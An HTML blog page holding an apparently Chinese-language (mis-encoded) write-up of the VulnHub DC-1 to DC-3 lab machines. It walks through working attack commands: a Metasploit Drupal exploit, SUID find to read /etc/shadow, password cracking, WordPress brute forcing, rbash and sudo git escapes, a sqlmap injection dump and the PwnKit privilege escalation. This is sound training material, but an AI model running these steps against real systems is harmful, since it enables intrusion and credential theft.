<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.140.2"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>DC 1-3 Writeup - zrquan</title>
<meta name=author content="[4shen0ne]"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="writeup,vulnhub"><meta property="og:title" content="DC 1-3 Writeup"><meta name=twitter:title content="DC 1-3 Writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/dc1-3/"><meta property="og:description" content="ã€Œ DC ã€æ˜¯ vulnhub ä¸Šçš„ç³»åˆ—é¶æœºï¼Œå› ä¸ºå‚åŠ çš„æŸä¸ªåŸ¹è®­è¯¾ç¨‹ç”¨ DC1-3 è¿™ä¸‰ä¸ªç¯å¢ƒä½œä¸ºç»ƒä¹ é¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹"><meta name=twitter:description content="ã€Œ DC ã€æ˜¯ vulnhub ä¸Šçš„ç³»åˆ—é¶æœºï¼Œå› ä¸ºå‚åŠ çš„æŸä¸ªåŸ¹è®­è¯¾ç¨‹ç”¨ DC1-3 è¿™ä¸‰ä¸ªç¯å¢ƒä½œä¸ºç»ƒä¹ é¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹"><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2024-12-26T00:00:00+08:00"><meta property="article:modified_time" content="2024-12-26T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.4c44b7b7f176c7ea2e7d3a85a954d45c0d3e801e81eacbad84c7f9575b51e65dc11b59ff1a372389e8b4e0821d6bbb5a668fe9c3e77af9418acb79126a035a1f.css integrity="sha512-TES3t/F2x+oufTqFqVTUXA0+gB6B6suthMf5V1tR5l3BG1n/Gjcjiei04IIda7taZo/pw+d6+UGKy3kSagNaHw=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/dc1-3/>DC 1-3 Writeup</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2024-12-26</span>
<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;1968 words</span>
<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/writeup>writeup</a>&nbsp;<a href=/tags/vulnhub>vulnhub</a>&nbsp;</span></div><div class="post-content markdown-body"><p><a href=https://www.vulnhub.com/series/dc,199/ target=_blank>ã€Œ DC ã€æ˜¯ vulnhub ä¸Šçš„ç³»åˆ—é¶æœº</a>ï¼Œå› ä¸ºå‚åŠ çš„æŸä¸ªåŸ¹è®­è¯¾ç¨‹ç”¨ DC1-3 è¿™ä¸‰ä¸ªç¯å¢ƒä½œä¸ºç»ƒä¹ é¢˜ç›®ï¼Œæ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹å¤ç°çš„è¿‡ç¨‹</p><h2 id=ç½‘ç»œè®¾ç½®>ç½‘ç»œè®¾ç½®</h2><p>é¶æœºä½¿ç”¨çš„æ˜¯é™æ€ IP åœ°å€å’Œè™šæ‹Ÿæœºçš„ã€Œæ¡¥æ¥ç½‘ç»œã€æ¨¡å¼ï¼Œè¿™ä¸ªæ¨¡å¼ä¼šæŠŠå®¿ä¸»æœºæ‰€åœ¨ç½‘æ®µçš„ IP åˆ†é…ç»™è™šæ‹Ÿæœºï¼Œè€Œå®¿ä¸»æœºæ‰€åœ¨çš„ç½‘æ®µæœªå¿…å’Œé¶æœºè®¾ç½®çš„é™æ€ç½‘æ®µç›¸åŒï¼Œè¿™å°±å¯¼è‡´ç½‘å¡æ— æ³•æ­£å¸¸å¯åŠ¨</p><p>é‚£ä¹ˆé¦–å…ˆè¦è¿›å…¥ç³»ç»Ÿä¿®æ”¹ /etc/network/interfaces æ–‡ä»¶ï¼Œæ”¹æˆ DHCP çš„æ–¹å¼è·å– IPã€‚å› ä¸ºé¶æœºæ²¡æœ‰æä¾›ç³»ç»Ÿç”¨æˆ·å¯†ç ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ <a href=https://zh.wikipedia.org/zh-cn/GNU_GRUB target=_blank>GRUB</a> çš„å¯åŠ¨å‚æ•°è¿›å…¥ç³»ç»Ÿ<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><p>ä»¥é¶æœºçš„ Debian ç³»ç»Ÿä¸ºä¾‹ï¼ˆå…¶ä»–ç³»ç»Ÿä¼šæœ‰åŒºåˆ«ï¼‰ï¼Œè¿›å…¥å¯åŠ¨èœå•åæŒ‰ e ç¼–è¾‘</p><figure><img src=/ox-hugo/_20241225_234416screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234416screenshot.png></figure><p>æ‰¾åˆ° roï¼ˆ read-only ï¼‰ï¼Œæ”¹æˆã€Œå¯å†™ã€æƒé™å¹¶æŒ‡å®šå¯åŠ¨ shell</p><pre><code class=language-text>rw signie init=/bin/bash
</code></pre><figure><img src=/ox-hugo/_20241225_234645screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234645screenshot.png></figure><figure><img src=/ox-hugo/_20241225_234718screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241225_234718screenshot.png></figure><p>è¿›å…¥ç³»ç»Ÿåç¼–è¾‘ /etc/network/interfacesï¼ŒæŠŠ eth0 ç½‘å¡æ”¹æˆ DHCP</p><pre><code class=language-text>allow-hotplug eth0
iface eth0 inet dhcp
</code></pre><p>è‡ªåŠ¨è·å– IP</p><pre><code class=language-text>dhclient eth0
</code></pre><p>ç„¶åé‡å¯</p><h2 id=dc-1>DC-1</h2><p><code>nmap -sV</code> æ”¶é›†ç«¯å£ä¿¡æ¯</p><pre><code class=language-text>22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><p>80 ç«¯å£æ˜¯ Drupal CMSï¼Œåº”è¯¥æ˜¯ CVE-2018-7600 ä½†æ˜¯æˆ‘ç”¨ nuclei æ²¡æ‰«å‡ºæ¥ğŸ¤”</p><p>ç”¨ metasploit çš„ drupal_drupalgeddon2 æ¨¡å—ç›´æ¥æ‹¿åˆ° shell</p><pre><code class=language-shell>use unix/webapp/drupal_drupalgeddon2
set RHOSTS 192.168.124.5
run
...
meterpreter &gt; shell -it
</code></pre><p>ç½‘ç«™æ ¹ç›®å½• flag1.txt ä¸­æœ‰æç¤º</p><pre><code class=language-text>Every good CMS needs a config file - and so do you.
</code></pre><p>æ ¹æ®æç¤ºæœä¸€ä¸‹é…ç½®æ–‡ä»¶</p><pre><code class=language-shell>find . -name settings*
# ./sites/default/settings.php
</code></pre><pre><code class=language-text>&lt;?php

/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' =&gt;
  array (
    'default' =&gt;
    array (
      'database' =&gt; 'drupaldb',
      'username' =&gt; 'dbuser',
      'password' =&gt; 'R0ck3t',
      'host' =&gt; 'localhost',
      'port' =&gt; '',
      'driver' =&gt; 'mysql',
      'prefix' =&gt; '',
    ),
  ),
);
...
</code></pre><div class=src-block-caption><span class=src-block-number>Code Snippet 1:</span>
settings.php</div><p>å°è¯•ç™»å½• mysqlï¼Œæ³¨æ„ <code>-p</code> å‚æ•°å’Œå¯†ç é—´<a href=https://jacobtomlinson.dev/posts/2013/why-is-there-no-space-in-the-mysql-password-parameter/ target=_blank>ä¸è¦æœ‰ç©ºæ ¼</a></p><pre><code class=language-text>mysql -udbuser -pR0ck3t
</code></pre><p>åœ¨ drupaldb.users è¡¨é‡Œæ‰¾åˆ°ä¸‰ä¸ªç”¨æˆ·ï¼Œå¯†ç éƒ½æ˜¯ç»è¿‡åŠ å¯†çš„</p><table><thead><tr><th>name</th><th>pass</th></tr></thead><tbody><tr><td>admin</td><td>$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</td></tr><tr><td>Fred</td><td>$S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</td></tr><tr><td>test</td><td>$S$DTwWb.MjZ8ihU.gMo1vZu32NCKL5p6YJpDVqgorKBibR/bdHK6/k</td></tr></tbody></table><p>ç›´æ¥ç ´è§£å¯†æ–‡æ¯”è¾ƒéš¾ï¼Œè€Œä¸”å®˜æ–¹æä¾›äº†å¯†ç çš„åŠ å¯†è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬åŠ å¯†ä¸€ä¸ªæ–°å¯†ç æ›¿æ¢ admin çš„åŸå¯†ç <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><pre><code class=language-text>www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 1234

password: 1234          hash: $S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK
</code></pre><pre><code class=language-text>mysql&gt; update drupaldb.users set pass='$S$DztFxVCdeC3ja0/0GJ.ZkDa01hC/FD5zgb6Ar3/vb1Gzfqu2rhAK' where name='admin';
</code></pre><p>ä¿®æ”¹å¯†ç åç™»å½•åå°ï¼Œåœ¨ Content é¡µæ‰¾åˆ° flag3ï¼Œåˆæ˜¯æ–°çš„æç¤º</p><pre><code class=language-text>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
</code></pre><p>è¿™é‡Œ PERMS å’Œ FIND ä¸¤ä¸ªå¤§å†™å•è¯ç»™äº†æç¤ºï¼Œåº”è¯¥æ˜¯ç”¨ find çš„ SUID ææƒè¯»å– shadow æ–‡ä»¶å†…å®¹</p><details><summary>find . -exec cat /etc/shadow \; -quit</summary><div class=details><pre><code class=language-text>root:$6$91zYUPrB$A/i0KqmGAi.forD5idrSFrDlPGLDoHr33g0gTfW8oJsCBptPsNRNoc0XoqkCwvFU4XMqrocm4KYtPBLqorFpW0:19823:0:99999:7:::
daemon:*:17946:0:99999:7:::
bin:*:17946:0:99999:7:::
sys:*:17946:0:99999:7:::
sync:*:17946:0:99999:7:::
games:*:17946:0:99999:7:::
man:*:17946:0:99999:7:::
lp:*:17946:0:99999:7:::
mail:*:17946:0:99999:7:::
news:*:17946:0:99999:7:::
uucp:*:17946:0:99999:7:::
proxy:*:17946:0:99999:7:::
www-data:*:17946:0:99999:7:::
backup:*:17946:0:99999:7:::
list:*:17946:0:99999:7:::
irc:*:17946:0:99999:7:::
gnats:*:17946:0:99999:7:::
nobody:*:17946:0:99999:7:::
libuuid:!:17946:0:99999:7:::
Debian-exim:!:17946:0:99999:7:::
statd:*:17946:0:99999:7:::
messagebus:*:17946:0:99999:7:::
sshd:*:17946:0:99999:7:::
mysql:!:17946:0:99999:7:::
flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
</code></pre></div></details><p>æ‹¿åˆ° shadow çš„å†…å®¹åç›´æ¥ç»™ john ç ´è§£å¾—åˆ°å¼±å£ä»¤</p><pre><code class=language-text>â¯ john dc1-shadow
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
123456           (root)
orange           (flag4)
</code></pre><p>å…ˆ ssh ç™»å½• rootï¼Œç„¶åæ‰¾åˆ° /root/thefinalflag.txt</p><pre><code class=language-text>Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
</code></pre><p>å•Šï¼Ÿé€šå…³äº†ï¼Ÿé‚£ flag4 æ˜¯å•¥ï¼Ÿ</p><p>ç™»å½• flag4 æœ‰ä¸ªæç¤º /home/flag4/flag4.txt ğŸ¤”</p><pre><code class=language-text>Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
</code></pre><h2 id=dc-2>DC-2</h2><p>nmap æ‰«ä¸€ä¸‹åªæ‰«åˆ° 80 ç«¯å£ï¼Œç›´æ¥ç”¨ IP è®¿é—®ä¼šè¢«é‡å®šå‘åˆ° <code>http://dc-2/</code> ï¼Œéœ€è¦ä¿®æ”¹ hosts æ–‡ä»¶</p><p>è¿›å»åçŸ¥é“è¿™æ˜¯ä¸ª WordPress ç«™ç‚¹ï¼Œå¹¶ä¸”æ‰¾åˆ°ç¬¬ä¸€ä¸ªæç¤ºï¼ˆflag 1ï¼‰</p><figure><img src=/ox-hugo/_20241226_092122screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_092122screenshot.png></figure><p><del>é¦–å…ˆ nuclei æ‰«ä¸€ä¸‹ WordPressï¼Œç”¨ wpscan ä¹Ÿè¡Œï¼Œä½†æ˜¯ arch æºä»“åº“çš„ wpscan è²Œä¼¼<a href=https://gitlab.archlinux.org/archlinux/packaging/packages/wpscan/-/issues/2 target=_blank>å‡ºäº†ä¸ª bug</a></del></p><figure><img src=/ox-hugo/_20241226_092508screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_092508screenshot.png></figure><p>è¿˜æ˜¯ç”¨ wpscan æ‰«æ¯”è¾ƒå¥½ï¼Œnuclei ç€é‡æ¼æ´ã€Œæ£€æµ‹ã€è€Œä¸æ˜¯ã€Œåˆ©ç”¨ã€ï¼Œæ‰«å‡ºæ¥çš„ç”¨æˆ·åä¸å…¨</p><div class=notes><p>å¦‚ä½•ä½ å’Œæˆ‘ä¸€æ ·ç”¨çš„æ˜¯ Arch ç³»ç»Ÿï¼Œä»æºä»“åº“ä¸‹è½½çš„ wpscan å¯èƒ½ä¼šå‡ºç°é”™è¯¯</p><pre><code class=language-text>cannot load such file -- ffi_c
</code></pre><p>ç›´æ¥ç”¨ gemï¼ˆruby çš„åŒ…ç®¡ç†å™¨ï¼‰æ¥ä¸‹è½½å°±æ²¡é—®é¢˜äº†</p><pre><code class=language-text>gem install wpscan
</code></pre></div><pre><code class=language-text>wpscan --url http://dc-2 -e
</code></pre><figure><img src=/ox-hugo/_20241226_102417screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_102417screenshot.png></figure><p>æ‰«å‡ºæ¥ä¸€ä¸ªç™»å½•é¡µå’Œç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œå†è”ç³»åˆ° flag1 æç¤ºçš„ <a href=https://github.com/digininja/CeWL target=_blank>cewl</a> æ˜¯ä¸€ä¸ªå­—å…¸ç”Ÿæˆå·¥å…·ï¼Œæ‰€ä»¥å°è¯•å¯¹æšä¸¾å‡ºæ¥çš„ç”¨æˆ·åè¿›è¡Œæš´åŠ›ç ´è§£</p><p>å…ˆæ„å»ºä¸€ä¸ªå¯†ç å­—å…¸ï¼Œç„¶åç»“åˆ wpscan æ‰«å‡ºæ¥çš„ç”¨æˆ·åæš´åŠ›ç ´è§£</p><pre><code class=language-shell>cewl -w pass.txt http://dc-2
wpscan --url http://dc-2 -U admin,jerry,tom -P pass.txt
</code></pre><p>tom å’Œ jerry éƒ½æ‰«å‡ºæ¥äº†å¼±å£ä»¤</p><figure><img src=/ox-hugo/_20241226_102937screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_102937screenshot.png></figure><p>ç™»å½•è¿›å»æ‰¾åˆ°æ–°æç¤ºï¼Œä¼¼ä¹ WordPress è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„ï¼Œå¾—å¦è¾Ÿè¹Šå¾„</p><figure><img src=/ox-hugo/_20241226_094429screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_094429screenshot.png></figure><p>å‘ç°ä¸€å¼€å§‹ç”¨ nmap çš„é»˜è®¤å‚æ•°æ‰«ç«¯å£æ¼äº†ä¸€ä¸ªï¼Œåº”è¯¥æ‰«å…¨ç«¯å£çš„ğŸ˜…</p><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr></thead><tbody><tr><td>80/tcp</td><td>open</td><td>http</td><td>Apache httpd 2.4.10 ((Debian))</td></tr><tr><td>7744/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</td></tr></tbody></table><p>å°è¯•ä¸€ä¸‹å‘ç° tom çš„ wordpress å¯†ç å’Œ ssh å¯†ç ç›¸åŒï¼Œç›´æ¥ç™»å½•</p><pre><code class=language-text>ssh tom@dc-2 -p 7744
</code></pre><p>å‘ç° shell æ˜¯ <a href=https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html target=_blank>rbash</a>ï¼Œå¾ˆå¤šå‘½ä»¤æ— æ³•ä½¿ç”¨ï¼Œå¯ä»¥ç”¨ <code>compgen -c</code> çœ‹çœ‹å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤æœ‰å“ªäº›</p><p>çœ‹åˆ°å¯ä»¥è¿è¡Œ viï¼ˆå…¶å®è¿è¡Œçš„æ˜¯ vimï¼‰é‚£ä¹ˆå‚è€ƒ <a href=https://gtfobins.github.io/gtfobins/vim/ target=_blank>GTFOBins</a> è¿›è¡Œææƒ</p><pre><code class=language-text>vi --cmd ':set shell=/bin/bash|:shell'
</code></pre><p>ä¹‹åå†æ‰§è¡Œå‘½ä»¤ä¼šæ˜¾ç¤º <code>command not found</code> ä½†å…¶å®å·²ç»æ‹¿åˆ°åŠŸèƒ½å®Œæ•´çš„ bash shell äº†ï¼Œæ›´æ–°ä¸€ä¸‹ PATH ç¯å¢ƒå˜é‡å³å¯æ‰§è¡Œå¸¸ç”¨å‘½ä»¤</p><pre><code class=language-shell>export PATH=/bin:/sbin:/usr/bin:/usr/sbin
cat flag3.txt
# Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
</code></pre><p>æ ¹æ® flag3 çš„æç¤ºä½¿ç”¨ su åˆ‡æ¢åˆ° jerry ç”¨æˆ·ï¼Œå¯†ç æ˜¯ä¹‹å‰æ‰«å‡ºæ¥çš„ wordpress å¯†ç ï¼Œè¯»åˆ° flag4ï¼ˆtom ä¹Ÿèƒ½è¯»åˆ°ï¼‰</p><pre><code class=language-shell>cat /home/jerry/flag4.txt
# Good to see that you've made it this far - but you're not home yet.
# You still need to get the final flag (the only flag that really counts!!!).
# No hints here - you're on your own now.  :-)
# Go on - git outta here!!!!
</code></pre><p>è¿˜æœ‰æœ€åä¸€ä¸ª flagï¼Œè€Œä¸”æç¤ºäº† gitï¼Œè‡ªç„¶æƒ³åˆ°<a href=https://gtfobins.github.io/gtfobins/git/ target=_blank>åˆ©ç”¨ git ææƒ</a></p><p>é¦–å…ˆæ£€æŸ¥ä¸€ä¸‹ jerry çš„ sudo åˆ—è¡¨ï¼Œå¯ä»¥æ‰§è¡Œ gitï¼ˆtom æ²¡æœ‰ sudo æƒé™ï¼‰</p><pre><code class=language-shell>sudo -l
# User jerry may run the following commands on DC-2:
#     (root) NOPASSWD: /usr/bin/git
</code></pre><p>è™½ç„¶ä¸å…è®¸è®¾ç½® PAGER ç¯å¢ƒå˜é‡ï¼Œä½†å¯ä»¥å…ˆè¿›å…¥é»˜è®¤ pager å†æ‰§è¡Œå‘½ä»¤</p><pre><code class=language-shell>sudo git -p help config
!/bin/bash
</code></pre><details><summary>cat /root/final-flag.txt</summary><div class=details><pre><code class=language-text> __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div></details><h2 id=dc-3>DC-3</h2><p>å…ˆæ‰«ä¸€ä¸‹å…¨ç«¯å£ï¼Œè¿™æ¬¡ç¡®å®šåªæœ‰ä¸€ä¸ª 80ï¼Œæ˜¯ä¸€ä¸ª Joomla ç«™ç‚¹</p><figure><img src=/ox-hugo/_20241226_145848screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_145848screenshot.png></figure><p>nuclei ç›´æ¥æ‰«å‡ºæ¥åå°å’Œ CVE-2017-8917</p><figure><img src=/ox-hugo/_20241226_145936screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_145936screenshot.png></figure><p>ç”¨ sqlmap ç¿»ä¸€ä¸‹æ•°æ®åº“ï¼Œæ‰¾åˆ° admin çš„ç”¨æˆ·åå¯†ç </p><pre><code class=language-shell>sqlmap -u http://192.168.220.165/index.php\?option\=com_fields\&amp;view\=fields\&amp;layout\=modal\&amp;list\[fullordering\]\=x\* -D joomladb -T '#__users' -C name,username,password --dump --batch
</code></pre><figure><img src=/ox-hugo/_20241226_153054screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_153054screenshot.png></figure><p>Joomla çš„å¯†ç ç”¨ bcrypt åŠ å¯†è¿‡ï¼Œä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯åƒå‰é¢ DC-1 ä¸€æ ·ä¿®æ”¹ admin çš„å¯†ç ï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¡¨åæœ‰ç‰¹æ®Šç¬¦å·çš„é—®é¢˜ï¼Œç”¨ sqlmap ä¸€ç›´æ²¡æœ‰ä¿®æ”¹æˆåŠŸã€‚ç„¶åæ”¹ç”¨ john ç ´è§£å‡ºå¯†ç ä¸º snoopy</p><pre><code class=language-text>echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' &gt; pass &amp;&amp; john pass
</code></pre><p>æ‹¿åˆ°ç®¡ç†å‘˜å¯†ç åç™»å½• joomla åå°ï¼Œå¯ä»¥ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶ï¼Œé€šè¿‡ PHP åå¼¹ shell<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup></p><figure><img src=/ox-hugo/_20241226_194826screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_194826screenshot.png></figure><p>è®¿é—® /templates/beez3/error.php é¡µé¢è§¦å‘ï¼Œæ‹¿åˆ° www-data ç”¨æˆ·æƒé™çš„ shell</p><p>ä¸‹ä¸€æ­¥æ˜¯ææƒï¼ŒæŠŠ <a href=https://github.com/The-Z-Labs/linux-exploit-suggester target=_blank>linux-exploit-suggester</a> è„šæœ¬ä¼ ä¸Šå»æ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°ä¸å°‘ææƒé£é™©ç‚¹ï¼Œæˆ‘è¿™è¾¹ç”¨äº† <a href=https://github.com/berdav/CVE-2021-4034 target=_blank>PwnKit</a></p><figure><img src=/ox-hugo/_20241226_195428screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_195428screenshot.png></figure><p>éœ€è¦æŠŠ poc æºç ä¼ åˆ°é¶æœºä¸Šé¢ç¼–è¯‘ï¼Œä¸ç„¶å¯èƒ½å› ä¸º CPU æ¶æ„ä¸åŒæ‰§è¡Œä¸äº†ã€‚ææƒæˆåŠŸåæ‹¿åˆ° root ç”¨æˆ·ç›®å½•ä¸‹çš„ flag</p><figure><img src=/ox-hugo/_20241226_195938screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241226_195938screenshot.png></figure><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://blog.csdn.net/qq_45290991/article/details/114189156 target=_blank>https://blog.csdn.net/qq_45290991/article/details/114189156</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://drupalchina.cn/node/2128 target=_blank>https://drupalchina.cn/node/2128</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://www.leavesongs.com/PHP/backshell-via-php.html target=_blank>https://www.leavesongs.com/PHP/backshell-via-php.html</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/dc1-3/",this.page.identifier="dc1-3"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#ç½‘ç»œè®¾ç½®>ç½‘ç»œè®¾ç½®</a></li><li><a href=#dc-1>DC-1</a></li><li><a href=#dc-2>DC-2</a></li><li><a href=#dc-3>DC-3</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont icon-grid-sharp"></i></div><div class=btn-toggle-mode><i class="iconfont icon-contrast-sharp"></i></div><div class=btn-scroll-top><i class="iconfont icon-chevron-up-circle-sharp"></i></div></div><aside class=sidebar-mobile style=display:none><div class=sidebar-wrapper><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-links"><h3>Links</h3><ul><li><a href=https://github.com/zrquan target=_blank><span>GitHub</span></a></li><li><a href=https://notes-bice-five.vercel.app/ target=_blank><span>Notes</span></a></li></ul></div><div class="sidebar-item sidebar-tags"><h3>Tags</h3><div><span><a href=/tags/ctf/>Ctf</a>
</span><span><a href=/tags/cve/>Cve</a>
</span><span><a href=/tags/deserialize/>Deserialize</a>
</span><span><a href=/tags/emacs/>Emacs</a>
</span><span><a href=/tags/fastjson/>Fastjson</a>
</span><span><a href=/tags/hessian/>Hessian</a>
</span><span><a href=/tags/java/>Java</a>
</span><span><a href=/tags/kotlin/>Kotlin</a>
</span><span><a href=/tags/org-mode/>Org-Mode</a>
</span><span><a href=/tags/vulnhub/>Vulnhub</a>
</span><span><a href=/tags/web/>Web</a>
</span><span><a href=/tags/writeup/>Writeup</a></span></div></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#ç½‘ç»œè®¾ç½®>ç½‘ç»œè®¾ç½®</a></li><li><a href=#dc-1>DC-1</a></li><li><a href=#dc-2>DC-2</a></li><li><a href=#dc-3>DC-3</a></li></ul></nav></div></div></aside></main><footer><div class="container-lg clearfix"><div class="col-12 footer"><span>&copy; 2021-2025
<a href=https://zrquan.github.io/>zrquan</a>
| <a href=https://github.com/zrquan/zrquan.github.io>Source code</a>
